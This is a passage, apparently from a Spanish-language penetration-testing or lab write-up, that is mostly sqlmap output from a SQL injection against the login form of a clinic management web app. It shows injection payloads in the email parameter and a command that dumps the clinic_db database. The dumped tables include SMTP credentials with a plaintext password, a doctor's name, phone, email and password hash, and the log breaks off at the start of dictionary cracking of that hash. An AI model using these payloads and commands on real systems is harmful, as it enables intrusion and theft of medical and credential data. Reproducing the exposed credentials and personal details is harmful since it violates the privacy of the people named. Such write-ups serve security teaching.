database management system users [5]:
[*] ''@'localhost'
[*] 'pma'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'

[06:41:44] [INFO] fetching database names
[06:41:44] [INFO] retrieved: 'information_schema'
[06:41:44] [INFO] retrieved: 'phpmyadmin'
[06:41:44] [INFO] retrieved: 'clinic_db'
[06:41:44] [INFO] retrieved: 'test'
[06:41:44] [INFO] retrieved: 'performance_schema'
[06:41:45] [INFO] retrieved: 'mysql'
available databases [6]:
[*] clinic_db
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[06:41:45] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.195.143'
[06:41:45] [WARNING] your sqlmap version is outdated

[*] ending @ 06:41:45 /2024-05-24/
```

Hemos descubierto las bases de datos que se encuentran en el servidor, yo elejire `clinic_db`, lo haremos de la siguiente manera...

```shell
sqlmap -r request.txt --dbms=mysql --dbs --users --risk=3 --level=5 -D clinic_db --tables --dump
```

Info:

```
        ___
       __H__                                                                                                                                        
 ___ ___[']_____ ___ ___  {1.7.11#stable}                                                                                                           
|_ -| . [,]     | .'| . |                                                                                                                           
|___|_  [(]_|_|_|__,|  _|                                                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:46:24 /2024-05-24/

[06:46:24] [INFO] parsing HTTP request from 'hms.sql'
[06:46:24] [WARNING] provided value for parameter 'btn_login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[06:46:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=admin&email=test@gmail.com' OR NOT 8870=8870-- NmEY&password=aa&btn_login=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=admin&email=test@gmail.com' OR (SELECT 7125 FROM(SELECT COUNT(*),CONCAT(0x7162717671,(SELECT (ELT(7125=7125,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- idzu&password=aa&btn_login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin&email=test@gmail.com' AND (SELECT 5999 FROM (SELECT(SLEEP(5)))dtkH)-- MpGo&password=aa&btn_login=
---
[06:46:24] [INFO] testing MySQL
[06:46:25] [INFO] confirming MySQL
[06:46:25] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.29, Apache 2.4.48
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[06:46:25] [INFO] fetching database users
database management system users [5]:
[*] ''@'localhost'
[*] 'pma'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'

[06:46:25] [INFO] fetching database names
[06:46:25] [INFO] resumed: 'information_schema'
[06:46:25] [INFO] resumed: 'phpmyadmin'
[06:46:25] [INFO] resumed: 'clinic_db'
[06:46:25] [INFO] resumed: 'test'
[06:46:25] [INFO] resumed: 'performance_schema'
[06:46:25] [INFO] resumed: 'mysql'
available databases [6]:
[*] clinic_db
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[06:46:25] [INFO] fetching tables for database: 'clinic_db'
[06:46:25] [INFO] retrieved: 'admin'
[06:46:25] [INFO] retrieved: 'appointment'
[06:46:25] [INFO] retrieved: 'billing'
[06:46:25] [INFO] retrieved: 'billing_records'
[06:46:25] [INFO] retrieved: 'department'
[06:46:25] [INFO] retrieved: 'doctor'
[06:46:25] [INFO] retrieved: 'doctor_timings'
[06:46:25] [INFO] retrieved: 'manage_website'
[06:46:26] [INFO] retrieved: 'medicine'
[06:46:26] [INFO] retrieved: 'orders'
[06:46:26] [INFO] retrieved: 'patient'
[06:46:26] [INFO] retrieved: 'payment'
[06:46:26] [INFO] retrieved: 'prescription'
[06:46:26] [INFO] retrieved: 'prescription_records'
[06:46:26] [INFO] retrieved: 'room'
[06:46:26] [INFO] retrieved: 'service_type'
[06:46:26] [INFO] retrieved: 'tbl_email_config'
[06:46:26] [INFO] retrieved: 'tbl_permission'
[06:46:26] [INFO] retrieved: 'tbl_permission_role'
[06:46:26] [INFO] retrieved: 'tbl_role'
[06:46:26] [INFO] retrieved: 'tbl_sms_config'
[06:46:26] [INFO] retrieved: 'treatment'
[06:46:26] [INFO] retrieved: 'treatment_records'
[06:46:26] [INFO] retrieved: 'user'
Database: clinic_db
[24 tables]
+----------------------+
| admin                |
| user                 |
| appointment          |
| billing              |
| billing_records      |
| department           |
| doctor               |
| doctor_timings       |
| manage_website       |
| medicine             |
| orders               |
| patient              |
| payment              |
| prescription         |
| prescription_records |
| room                 |
| service_type         |
| tbl_email_config     |
| tbl_permission       |
| tbl_permission_role  |
| tbl_role             |
| tbl_sms_config       |
| treatment            |
| treatment_records    |
+----------------------+

[06:46:26] [INFO] fetching columns for table 'service_type' in database 'clinic_db'
[06:46:26] [INFO] retrieved: 'service_type_id'
[06:46:26] [INFO] retrieved: 'int(10)'
[06:46:26] [INFO] retrieved: 'service_type'
[06:46:26] [INFO] retrieved: 'varchar(100)'
[06:46:26] [INFO] retrieved: 'servicecharge'
[06:46:26] [INFO] retrieved: 'float(10,2)'
[06:46:26] [INFO] retrieved: 'description'
[06:46:26] [INFO] retrieved: 'text'
[06:46:26] [INFO] retrieved: 'status'
[06:46:26] [INFO] retrieved: 'varchar(10)'
[06:46:26] [INFO] fetching entries for table 'service_type' in database 'clinic_db'
[06:46:26] [INFO] retrieved: 'To take fractured photo copy'
[06:46:26] [INFO] retrieved: 'Active'
[06:46:26] [INFO] retrieved: 'X-ray'
[06:46:26] [INFO] retrieved: '10'
[06:46:26] [INFO] retrieved: '250.00'
[06:46:26] [INFO] retrieved: 'To scan body from injury'
[06:46:26] [INFO] retrieved: 'Active'
[06:46:27] [INFO] retrieved: 'Scanning'
[06:46:27] [INFO] retrieved: '11'
[06:46:27] [INFO] retrieved: '450.00'
[06:46:27] [INFO] retrieved: 'Regarding body scan'
[06:46:27] [INFO] retrieved: 'Active'
[06:46:27] [INFO] retrieved: 'MRI'
[06:46:27] [INFO] retrieved: '12'
[06:46:27] [INFO] retrieved: '300.00'
[06:46:27] [INFO] retrieved: 'To detect the type of disease'
[06:46:27] [INFO] retrieved: 'Active'
[06:46:27] [INFO] retrieved: 'Blood Testing'
[06:46:27] [INFO] retrieved: '13'
[06:46:27] [INFO] retrieved: '150.00'
[06:46:27] [INFO] retrieved: 'To analyse the diagnosis'
[06:46:27] [INFO] retrieved: 'Active'
[06:46:27] [INFO] retrieved: 'Diagnosis'
[06:46:27] [INFO] retrieved: '14'
[06:46:27] [INFO] retrieved: '210.00'
Database: clinic_db
Table: service_type
[5 entries]
+-----------------+----------+---------------+-------------------------------+---------------+
| service_type_id | status   | service_type  | description                   | servicecharge |
+-----------------+----------+---------------+-------------------------------+---------------+
| 10              | Active   | X-ray         | To take fractured photo copy  | 250.00        |
| 11              | Active   | Scanning      | To scan body from injury      | 450.00        |
| 12              | Active   | MRI           | Regarding body scan           | 300.00        |
| 13              | Active   | Blood Testing | To detect the type of disease | 150.00        |
| 14              | Active   | Diagnosis     | To analyse the diagnosis      | 210.00        |
+-----------------+----------+---------------+-------------------------------+---------------+

[06:46:27] [INFO] table 'clinic_db.service_type' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/service_type.csv'                                                                                                                                                  
[06:46:27] [INFO] fetching columns for table 'appointment' in database 'clinic_db'
[06:46:27] [INFO] retrieved: 'appointmentid'
[06:46:27] [INFO] retrieved: 'int(10)'
[06:46:27] [INFO] retrieved: 'appointmenttype'
[06:46:27] [INFO] retrieved: 'varchar(25)'
[06:46:27] [INFO] retrieved: 'patientid'
[06:46:27] [INFO] retrieved: 'int(10)'
[06:46:27] [INFO] retrieved: 'roomid'
[06:46:27] [INFO] retrieved: 'int(10)'
[06:46:27] [INFO] retrieved: 'departmentid'
[06:46:27] [INFO] retrieved: 'int(10)'
[06:46:27] [INFO] retrieved: 'appointmentdate'
[06:46:27] [INFO] retrieved: 'date'
[06:46:27] [INFO] retrieved: 'appointmenttime'
[06:46:27] [INFO] retrieved: 'time'
[06:46:27] [INFO] retrieved: 'doctorid'
[06:46:28] [INFO] retrieved: 'int(10)'
[06:46:28] [INFO] retrieved: 'status'
[06:46:28] [INFO] retrieved: 'varchar(10)'
[06:46:28] [INFO] retrieved: 'app_reason'
[06:46:28] [INFO] retrieved: 'text'
[06:46:28] [INFO] retrieved: 'delete_status'
[06:46:28] [INFO] retrieved: 'int(11)'
[06:46:28] [INFO] fetching entries for table 'appointment' in database 'clinic_db'
[06:46:28] [INFO] retrieved: 'Active'
[06:46:28] [INFO] retrieved: 'Reason of appointment'
[06:46:28] [INFO] retrieved: '2020-05-29'
[06:46:28] [INFO] retrieved: '4'
[06:46:28] [INFO] retrieved: '15:00:00'
[06:46:28] [INFO] retrieved: ''
[06:46:28] [INFO] retrieved: '0'
[06:46:28] [INFO] retrieved: '2'
[06:46:28] [INFO] retrieved: '1'
[06:46:28] [INFO] retrieved: '1'
[06:46:28] [INFO] retrieved: '0'
[06:46:28] [INFO] retrieved: 'Active'
[06:46:28] [INFO] retrieved: 'reason of appointment'
[06:46:28] [INFO] retrieved: '2020-05-27'
[06:46:28] [INFO] retrieved: '2'
[06:46:28] [INFO] retrieved: '10:00:00'
[06:46:28] [INFO] retrieved: ''
[06:46:28] [INFO] retrieved: '0'
[06:46:28] [INFO] retrieved: '2'
[06:46:28] [INFO] retrieved: '1'
[06:46:28] [INFO] retrieved: '1'
[06:46:28] [INFO] retrieved: '0'
[06:46:28] [INFO] retrieved: 'Inactive'
[06:46:28] [INFO] retrieved: 'reason'
[06:46:28] [INFO] retrieved: '2020-05-26'
[06:46:28] [INFO] retrieved: '3'
[06:46:28] [INFO] retrieved: '11:11:00'
[06:46:28] [INFO] retrieved: ''
[06:46:28] [INFO] retrieved: '0'
[06:46:28] [INFO] retrieved: '1'
[06:46:29] [INFO] retrieved: '1'
[06:46:29] [INFO] retrieved: '1'
[06:46:29] [INFO] retrieved: '0'
[06:46:29] [INFO] retrieved: 'Active'
[06:46:29] [INFO] retrieved: 'reason of appointment'
[06:46:29] [INFO] retrieved: '2020-05-29'
[06:46:29] [INFO] retrieved: '4'
[06:46:29] [INFO] retrieved: '15:00:00'
[06:46:29] [INFO] retrieved: ''
[06:46:29] [INFO] retrieved: '0'
[06:46:29] [INFO] retrieved: '2'
[06:46:29] [INFO] retrieved: '1'
[06:46:29] [INFO] retrieved: '1'
[06:46:29] [INFO] retrieved: '0'
Database: clinic_db
Table: appointment
[4 entries]
+--------+----------+-----------+--------------+---------------+----------+-----------------------+---------------+-----------------+-----------------+-----------------+
| roomid | doctorid | patientid | departmentid | appointmentid | status   | app_reason            | delete_status | appointmentdate | appointmenttime | appointmenttype |
+--------+----------+-----------+--------------+---------------+----------+-----------------------+---------------+-----------------+-----------------+-----------------+
| 0      | 1        | 1         | 2            | 4             | Active   | Reason of appointment | 0             | 2020-05-29      | 15:00:00        | <blank>         |
| 0      | 1        | 1         | 2            | 2             | Active   | reason of appointment | 0             | 2020-05-27      | 10:00:00        | <blank>         |
| 0      | 1        | 1         | 1            | 3             | Inactive | reason                | 0             | 2020-05-26      | 11:11:00        | <blank>         |
| 0      | 1        | 1         | 2            | 4             | Active   | reason of appointment | 0             | 2020-05-29      | 15:00:00        | <blank>         |
+--------+----------+-----------+--------------+---------------+----------+-----------------------+---------------+-----------------+-----------------+-----------------+

[06:46:29] [INFO] table 'clinic_db.appointment' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/appointment.csv'
[06:46:29] [INFO] fetching columns for table 'tbl_email_config' in database 'clinic_db'
[06:46:29] [INFO] retrieved: 'e_id'
[06:46:29] [INFO] retrieved: 'int(21)'
[06:46:29] [INFO] retrieved: 'name'
[06:46:29] [INFO] retrieved: 'varchar(500)'
[06:46:29] [INFO] retrieved: 'mail_driver_host'
[06:46:29] [INFO] retrieved: 'varchar(5000)'
[06:46:29] [INFO] retrieved: 'mail_port'
[06:46:29] [INFO] retrieved: 'int(50)'
[06:46:29] [INFO] retrieved: 'mail_username'
[06:46:29] [INFO] retrieved: 'varchar(50)'
[06:46:29] [INFO] retrieved: 'mail_password'
[06:46:29] [INFO] retrieved: 'varchar(30)'
[06:46:29] [INFO] retrieved: 'mail_encrypt'
[06:46:29] [INFO] retrieved: 'varchar(300)'
[06:46:29] [INFO] fetching entries for table 'tbl_email_config' in database 'clinic_db'
[06:46:29] [INFO] retrieved: 'Upturn India Technologies'
[06:46:29] [INFO] retrieved: '1'
[06:46:29] [INFO] retrieved: 'mail.upturnit.com'
[06:46:29] [INFO] retrieved: 'sdsad'
[06:46:29] [INFO] retrieved: 'x(ilz?cWumI2'
[06:46:29] [INFO] retrieved: '587'
[06:46:29] [INFO] retrieved: 'contact.info@upturnit.com'
Database: clinic_db
Table: tbl_email_config
[1 entry]
+------+---------------------------+-----------+--------------+---------------+---------------------------+-------------------+
| e_id | name                      | mail_port | mail_encrypt | mail_password | mail_username             | mail_driver_host  |
+------+---------------------------+-----------+--------------+---------------+---------------------------+-------------------+
| 1    | Upturn India Technologies | 587       | sdsad        | x(ilz?cWumI2  | contact.info@upturnit.com | mail.upturnit.com |
+------+---------------------------+-----------+--------------+---------------+---------------------------+-------------------+

[06:46:30] [INFO] table 'clinic_db.tbl_email_config' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/tbl_email_config.csv'                                                                                                                                          
[06:46:30] [INFO] fetching columns for table 'tbl_permission' in database 'clinic_db'
[06:46:30] [INFO] retrieved: 'id'
[06:46:30] [INFO] retrieved: 'int(11)'
[06:46:30] [INFO] retrieved: 'name'
[06:46:30] [INFO] retrieved: 'varchar(200)'
[06:46:30] [INFO] retrieved: 'display_name'
[06:46:30] [INFO] retrieved: 'varchar(200)'
[06:46:30] [INFO] retrieved: 'operation'
[06:46:30] [INFO] retrieved: 'varchar(200)'
[06:46:30] [INFO] fetching entries for table 'tbl_permission' in database 'clinic_db'
[06:46:30] [INFO] retrieved: 'repairs'
[06:46:30] [INFO] retrieved: 'Repairs'
[06:46:30] [INFO] retrieved: '1'
[06:46:30] [INFO] retrieved: 'repairs'
[06:46:30] [INFO] retrieved: 'create_repair'
[06:46:30] [INFO] retrieved: 'Create Repair\t'
[06:46:30] [INFO] retrieved: '2'
[06:46:30] [INFO] retrieved: 'create_repair\t'
[06:46:30] [INFO] retrieved: 'edit_repair'
[06:46:30] [INFO] retrieved: 'Edit Repair'
[06:46:30] [INFO] retrieved: '3'
[06:46:30] [INFO] retrieved: 'edit_repair'
[06:46:30] [INFO] retrieved: 'delete_repair'
[06:46:30] [INFO] retrieved: 'Delete Repair'
[06:46:30] [INFO] retrieved: '4'
[06:46:30] [INFO] retrieved: 'delete_repair'
[06:46:30] [INFO] retrieved: 'manage_category'
[06:46:30] [INFO] retrieved: 'Manage Category'
[06:46:30] [INFO] retrieved: '5'
[06:46:30] [INFO] retrieved: 'manage_category'
[06:46:30] [INFO] retrieved: 'sales'
[06:46:30] [INFO] retrieved: 'Sales'
[06:46:30] [INFO] retrieved: '6'
[06:46:30] [INFO] retrieved: 'sales'
[06:46:30] [INFO] retrieved: 'invoices'
[06:46:30] [INFO] retrieved: 'Invoices'
[06:46:30] [INFO] retrieved: '7'
[06:46:31] [INFO] retrieved: 'invoices'
[06:46:31] [INFO] retrieved: 'edit_invoice'
[06:46:31] [INFO] retrieved: 'Edit Invoice'
[06:46:31] [INFO] retrieved: '8'
[06:46:31] [INFO] retrieved: 'edit_invoice'
[06:46:31] [INFO] retrieved: 'add_payment'
[06:46:31] [INFO] retrieved: 'Add Payment'
[06:46:31] [INFO] retrieved: '9'
[06:46:31] [INFO] retrieved: 'add_payment'
[06:46:31] [INFO] retrieved: 'custom_reports'
[06:46:31] [INFO] retrieved: 'Custom Reports'
[06:46:31] [INFO] retrieved: '10'
[06:46:31] [INFO] retrieved: 'custom_reports'
[06:46:31] [INFO] retrieved: 'financial_overview'
[06:46:31] [INFO] retrieved: 'Financial Overview'
[06:46:31] [INFO] retrieved: '11'
[06:46:31] [INFO] retrieved: 'financial_overview'
[06:46:31] [INFO] retrieved: 'manage_expense'
[06:46:31] [INFO] retrieved: 'Manage Expense'
[06:46:31] [INFO] retrieved: '12'
[06:46:31] [INFO] retrieved: 'manage_expense'
[06:46:31] [INFO] retrieved: 'create_expense'
[06:46:31] [INFO] retrieved: 'Create Expense'
[06:46:31] [INFO] retrieved: '13'
[06:46:31] [INFO] retrieved: 'create_expense'
[06:46:31] [INFO] retrieved: 'edit_expense'
[06:46:31] [INFO] retrieved: 'Edit Expense'
[06:46:31] [INFO] retrieved: '14'
[06:46:31] [INFO] retrieved: 'edit_expense'
[06:46:31] [INFO] retrieved: 'delete_expense'
[06:46:31] [INFO] retrieved: 'Delete Expense'
[06:46:31] [INFO] retrieved: '15'
[06:46:31] [INFO] retrieved: 'delete_expense'
[06:46:31] [INFO] retrieved: 'generate_invoice'
[06:46:31] [INFO] retrieved: 'Generate Invoice'
[06:46:31] [INFO] retrieved: '16'
[06:46:31] [INFO] retrieved: 'generate_invoice'
[06:46:31] [INFO] retrieved: 'products'
[06:46:31] [INFO] retrieved: 'Products'
[06:46:31] [INFO] retrieved: '17'
[06:46:31] [INFO] retrieved: 'products'
[06:46:31] [INFO] retrieved: 'create_product'
[06:46:31] [INFO] retrieved: 'Create Product'
[06:46:31] [INFO] retrieved: '18'
[06:46:32] [INFO] retrieved: 'create_product'
[06:46:32] [INFO] retrieved: 'edit_product'
[06:46:32] [INFO] retrieved: 'Edit Product'
[06:46:32] [INFO] retrieved: '19'
[06:46:32] [INFO] retrieved: 'edit_product'
[06:46:32] [INFO] retrieved: 'delete_product'
[06:46:32] [INFO] retrieved: 'Delete Product'
[06:46:32] [INFO] retrieved: '20'
[06:46:32] [INFO] retrieved: 'delete_product'
[06:46:32] [INFO] retrieved: 'users'
[06:46:32] [INFO] retrieved: 'Users'
[06:46:32] [INFO] retrieved: '21'
[06:46:32] [INFO] retrieved: 'users'
[06:46:32] [INFO] retrieved: 'create_user'
[06:46:32] [INFO] retrieved: 'Create User'
[06:46:32] [INFO] retrieved: '22'
[06:46:32] [INFO] retrieved: 'create_user'
[06:46:32] [INFO] retrieved: 'edit_user'
[06:46:32] [INFO] retrieved: 'Edit User'
[06:46:32] [INFO] retrieved: '23'
[06:46:32] [INFO] retrieved: 'edit_user'
[06:46:32] [INFO] retrieved: 'delete_user'
[06:46:32] [INFO] retrieved: 'Delete User'
[06:46:32] [INFO] retrieved: '24'
[06:46:32] [INFO] retrieved: 'delete_user'
[06:46:32] [INFO] retrieved: 'manage_roles'
[06:46:32] [INFO] retrieved: 'Manage Roles'
[06:46:32] [INFO] retrieved: '25'
[06:46:32] [INFO] retrieved: 'manage_roles'
[06:46:32] [INFO] retrieved: 'settings'
[06:46:32] [INFO] retrieved: 'Settings'
[06:46:32] [INFO] retrieved: '26'
[06:46:32] [INFO] retrieved: 'settings'
[06:46:32] [INFO] retrieved: 'communication'
[06:46:32] [INFO] retrieved: 'Communication'
[06:46:32] [INFO] retrieved: '27'
[06:46:32] [INFO] retrieved: 'communication'
[06:46:32] [INFO] retrieved: 'create_communication'
[06:46:32] [INFO] retrieved: 'Create Communication'
[06:46:33] [INFO] retrieved: '28'
[06:46:33] [INFO] retrieved: 'create_communication'
[06:46:33] [INFO] retrieved: 'delete_communication'
[06:46:33] [INFO] retrieved: 'Delete Communication'
[06:46:33] [INFO] retrieved: '29'
[06:46:33] [INFO] retrieved: 'delete_communication'
[06:46:33] [INFO] retrieved: 'payroll'
[06:46:33] [INFO] retrieved: 'Payroll'
[06:46:33] [INFO] retrieved: '30'
[06:46:33] [INFO] retrieved: 'payroll'
[06:46:33] [INFO] retrieved: 'create_payroll'
[06:46:33] [INFO] retrieved: 'Create Payroll'
[06:46:33] [INFO] retrieved: '31'
[06:46:33] [INFO] retrieved: 'create_payroll'
[06:46:33] [INFO] retrieved: 'edit_payroll'
[06:46:33] [INFO] retrieved: 'Edit Payroll'
[06:46:33] [INFO] retrieved: '32'
[06:46:33] [INFO] retrieved: 'edit_payroll'
[06:46:33] [INFO] retrieved: 'delete_payroll'
[06:46:33] [INFO] retrieved: 'Delete Payroll'
[06:46:33] [INFO] retrieved: '33'
[06:46:33] [INFO] retrieved: 'delete_payroll'
[06:46:33] [INFO] retrieved: 'departments'
[06:46:33] [INFO] retrieved: 'Departments'
[06:46:33] [INFO] retrieved: '34'
[06:46:33] [INFO] retrieved: 'departments'
[06:46:33] [INFO] retrieved: 'saved_items'
[06:46:33] [INFO] retrieved: 'Saved Item'
[06:46:33] [INFO] retrieved: '35'
[06:46:33] [INFO] retrieved: 'saved_items'
[06:46:33] [INFO] retrieved: 'create_saved_item'
[06:46:33] [INFO] retrieved: 'Create Saved Item'
[06:46:33] [INFO] retrieved: '36'
[06:46:33] [INFO] retrieved: 'create_saved_item'
[06:46:33] [INFO] retrieved: 'edit_saved_item'
[06:46:33] [INFO] retrieved: 'Edit Saved Item'
[06:46:33] [INFO] retrieved: '37'
[06:46:34] [INFO] retrieved: 'edit_saved_item'
[06:46:34] [INFO] retrieved: 'delete_saved_item'
[06:46:34] [INFO] retrieved: 'Delete Saved Item'
[06:46:34] [INFO] retrieved: '38'
[06:46:34] [INFO] retrieved: 'delete_saved_item'
[06:46:34] [INFO] retrieved: 'dashboard'
[06:46:34] [INFO] retrieved: 'Dashboard'
[06:46:34] [INFO] retrieved: '39'
[06:46:34] [INFO] retrieved: 'dashboard'
[06:46:34] [INFO] retrieved: 'clients_statistics'
[06:46:34] [INFO] retrieved: 'Clients Statistics'
[06:46:34] [INFO] retrieved: '40'
[06:46:34] [INFO] retrieved: 'clients_statistics'
[06:46:34] [INFO] retrieved: 'invoices_statistics'
[06:46:34] [INFO] retrieved: 'Invoices Statistics'
[06:46:34] [INFO] retrieved: '41'
[06:46:34] [INFO] retrieved: 'invoices_statistics'
[06:46:34] [INFO] retrieved: 'repairs_statistics'
[06:46:34] [INFO] retrieved: 'Repairs Statistics'
[06:46:34] [INFO] retrieved: '42'
[06:46:34] [INFO] retrieved: 'repairs_statistics'
[06:46:34] [INFO] retrieved: 'financial_overview_graph'
[06:46:34] [INFO] retrieved: 'Financial Overview Graph'
[06:46:34] [INFO] retrieved: '43'
[06:46:34] [INFO] retrieved: 'financial_overview_graph'
[06:46:34] [INFO] retrieved: 'calendar'
[06:46:34] [INFO] retrieved: 'Calendar'
[06:46:34] [INFO] retrieved: '44'
[06:46:34] [INFO] retrieved: 'calendar'
Database: clinic_db
Table: tbl_permission
[44 entries]
+----+--------------------------+--------------------------+--------------------------+
| id | name                     | operation                | display_name             |
+----+--------------------------+--------------------------+--------------------------+
| 1  | repairs                  | repairs                  | Repairs                  |
| 2  | create_repair            | create_repair\t          | Create Repair\t          |
| 3  | edit_repair              | edit_repair              | Edit Repair              |
| 4  | delete_repair            | delete_repair            | Delete Repair            |
| 5  | manage_category          | manage_category          | Manage Category          |
| 6  | sales                    | sales                    | Sales                    |
| 7  | invoices                 | invoices                 | Invoices                 |
| 8  | edit_invoice             | edit_invoice             | Edit Invoice             |
| 9  | add_payment              | add_payment              | Add Payment              |
| 10 | custom_reports           | custom_reports           | Custom Reports           |
| 11 | financial_overview       | financial_overview       | Financial Overview       |
| 12 | manage_expense           | manage_expense           | Manage Expense           |
| 13 | create_expense           | create_expense           | Create Expense           |
| 14 | edit_expense             | edit_expense             | Edit Expense             |
| 15 | delete_expense           | delete_expense           | Delete Expense           |
| 16 | generate_invoice         | generate_invoice         | Generate Invoice         |
| 17 | products                 | products                 | Products                 |
| 18 | create_product           | create_product           | Create Product           |
| 19 | edit_product             | edit_product             | Edit Product             |
| 20 | delete_product           | delete_product           | Delete Product           |
| 21 | users                    | users                    | Users                    |
| 22 | create_user              | create_user              | Create User              |
| 23 | edit_user                | edit_user                | Edit User                |
| 24 | delete_user              | delete_user              | Delete User              |
| 25 | manage_roles             | manage_roles             | Manage Roles             |
| 26 | settings                 | settings                 | Settings                 |
| 27 | communication            | communication            | Communication            |
| 28 | create_communication     | create_communication     | Create Communication     |
| 29 | delete_communication     | delete_communication     | Delete Communication     |
| 30 | payroll                  | payroll                  | Payroll                  |
| 31 | create_payroll           | create_payroll           | Create Payroll           |
| 32 | edit_payroll             | edit_payroll             | Edit Payroll             |
| 33 | delete_payroll           | delete_payroll           | Delete Payroll           |
| 34 | departments              | departments              | Departments              |
| 35 | saved_items              | saved_items              | Saved Item               |
| 36 | create_saved_item        | create_saved_item        | Create Saved Item        |
| 37 | edit_saved_item          | edit_saved_item          | Edit Saved Item          |
| 38 | delete_saved_item        | delete_saved_item        | Delete Saved Item        |
| 39 | dashboard                | dashboard                | Dashboard                |
| 40 | clients_statistics       | clients_statistics       | Clients Statistics       |
| 41 | invoices_statistics      | invoices_statistics      | Invoices Statistics      |
| 42 | repairs_statistics       | repairs_statistics       | Repairs Statistics       |
| 43 | financial_overview_graph | financial_overview_graph | Financial Overview Graph |
| 44 | calendar                 | calendar                 | Calendar                 |
+----+--------------------------+--------------------------+--------------------------+

[06:46:34] [INFO] table 'clinic_db.tbl_permission' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/tbl_permission.csv'                                                                                                                                              
[06:46:34] [INFO] fetching columns for table 'billing_records' in database 'clinic_db'
[06:46:34] [INFO] retrieved: 'billingservice_id'
[06:46:34] [INFO] retrieved: 'int(10)'
[06:46:34] [INFO] retrieved: 'billingid'
[06:46:34] [INFO] retrieved: 'int(10)'
[06:46:34] [INFO] retrieved: 'bill_type_id'
[06:46:35] [INFO] retrieved: 'int(10)'
[06:46:35] [INFO] retrieved: 'bill_type'
[06:46:35] [INFO] retrieved: 'varchar(250)'
[06:46:35] [INFO] retrieved: 'bill_amount'
[06:46:35] [INFO] retrieved: 'float(10,2)'
[06:46:35] [INFO] retrieved: 'bill_date'
[06:46:35] [INFO] retrieved: 'date'
[06:46:35] [INFO] retrieved: 'status'
[06:46:35] [INFO] retrieved: 'varchar(10)'
[06:46:35] [INFO] fetching entries for table 'billing_records' in database 'clinic_db'
[06:46:35] [INFO] fetching number of entries for table 'billing_records' in database 'clinic_db'
[06:46:35] [INFO] resumed: 0
[06:46:35] [WARNING] table 'billing_records' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: billing_records
[0 entries]
+-----------+--------------+-------------------+----------+-----------+-----------+-------------+
| billingid | bill_type_id | billingservice_id | status   | bill_date | bill_type | bill_amount |
+-----------+--------------+-------------------+----------+-----------+-----------+-------------+
+-----------+--------------+-------------------+----------+-----------+-----------+-------------+

[06:46:35] [INFO] table 'clinic_db.billing_records' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/billing_records.csv'                                                                                                                                            
[06:46:35] [INFO] fetching columns for table 'doctor' in database 'clinic_db'
[06:46:35] [INFO] retrieved: 'doctorid'
[06:46:35] [INFO] retrieved: 'int(10)'
[06:46:35] [INFO] retrieved: 'doctorname'
[06:46:35] [INFO] retrieved: 'varchar(50)'
[06:46:35] [INFO] retrieved: 'mobileno'
[06:46:35] [INFO] retrieved: 'varchar(15)'
[06:46:35] [INFO] retrieved: 'departmentid'
[06:46:35] [INFO] retrieved: 'int(10)'
[06:46:35] [INFO] retrieved: 'loginid'
[06:46:35] [INFO] retrieved: 'varchar(25)'
[06:46:35] [INFO] retrieved: 'password'
[06:46:35] [INFO] retrieved: 'text'
[06:46:35] [INFO] retrieved: 'status'
[06:46:35] [INFO] retrieved: 'varchar(10)'
[06:46:35] [INFO] retrieved: 'education'
[06:46:35] [INFO] retrieved: 'varchar(25)'
[06:46:35] [INFO] retrieved: 'experience'
[06:46:35] [INFO] retrieved: 'float(11,1)'
[06:46:35] [INFO] retrieved: 'consultancy_charge'
[06:46:35] [INFO] retrieved: 'float(10,2)'
[06:46:35] [INFO] retrieved: 'delete_status'
[06:46:35] [INFO] retrieved: 'int(11)'
[06:46:35] [INFO] fetching entries for table 'doctor' in database 'clinic_db'
[06:46:35] [INFO] retrieved: 'Active'
[06:46:35] [INFO] retrieved: '200.00'
[06:46:35] [INFO] retrieved: '0'
[06:46:36] [INFO] retrieved: '1'
[06:46:36] [INFO] retrieved: '1'
[06:46:36] [INFO] retrieved: 'Dr. Akash Ahire'
[06:46:36] [INFO] retrieved: 'MD'
[06:46:36] [INFO] retrieved: '3.0'
[06:46:36] [INFO] retrieved: 'akash@gmail.com'
[06:46:36] [INFO] retrieved: '9423979339'
[06:46:36] [INFO] retrieved: 'bbcff4db4d8057800d59a68224efd87e545fa1512dfc3ef68298283fbb3b6358'
[06:46:36] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[06:46:41] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[06:46:46] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[06:46:48] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[06:46:48] [INFO] starting 2 processes 
